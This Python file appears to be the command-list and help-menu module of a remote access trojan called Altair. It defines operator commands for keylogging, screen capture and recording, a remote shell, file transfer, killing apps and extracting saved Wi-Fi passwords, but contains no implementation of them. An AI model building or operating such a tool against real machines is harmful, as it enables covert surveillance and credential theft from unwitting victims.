from util import Console

class AltairCommandList:
    INFO = "get-info"
    EXIT = "exit"
    KEY_LOGGER = "k-lgr"
    SS = "get-screen_s"
    INCLUDE_SHELL = "i-shell"
    HELP = "help"
    SEND_FILE = "send-file"
    SCREEN_RECORD = "get-screen_r"
    WIN_MAP = "win-map"
    M_POS = "m.pos"
    HELPER = f"""{Console.CYAN}\t    ╰──/{Console.DEFAULT}{INFO}{Console.CYAN}        [{Console.GREEN}{Console.BOLD}INFORMATION{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{EXIT}{Console.CYAN}    \t\t[{Console.GREEN}{Console.BOLD}EXIT{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{KEY_LOGGER}{Console.CYAN}   \t\t[{Console.GREEN}{Console.BOLD}KEYLOGGER{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SS}{Console.CYAN}\t[{Console.GREEN}{Console.BOLD}SCREEN-SHOT{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{INCLUDE_SHELL}{Console.CYAN}      \t[{Console.GREEN}{Console.BOLD}INCLUDE-SHELL{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{WIN_MAP}{Console.CYAN}      \t[{Console.GREEN}{Console.BOLD}WINDOWS-MANUPULATION{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SEND_FILE}{Console.CYAN}      \t[{Console.GREEN}{Console.BOLD}SEND-FILE{Console.DEFAULT}{Console.CYAN}]
       ╰──/{Console.DEFAULT}{SCREEN_RECORD}{Console.CYAN:<8} [{Console.GREEN}{Console.BOLD}SCREEN-RECORD{Console.DEFAULT}{Console.CYAN}]""".expandtabs(4)

    HELPER_C = f"""\t{Console.CYAN}╰──/{Console.DEFAULT}get-apps{Console.CYAN:<11} [{Console.GREEN}{Console.BOLD}APP-LIST{Console.DEFAULT}{Console.CYAN}]
\t╰──/{Console.DEFAULT}kill{Console.CYAN:<15} [{Console.GREEN}{Console.BOLD}CLOSE-APP{Console.DEFAULT}{Console.CYAN}]
\t╰──/{Console.DEFAULT}get-wifi-passw{Console.CYAN:<5} [{Console.GREEN}{Console.BOLD}GET-WIFI-PASSWORDS{Console.DEFAULT}{Console.CYAN}]
\t╰──/{Console.DEFAULT}e--{Console.CYAN:<16} [{Console.GREEN}{Console.BOLD}EXIT-INCLUDE-SHELL{Console.DEFAULT}{Console.CYAN}]""".expandtabs(14)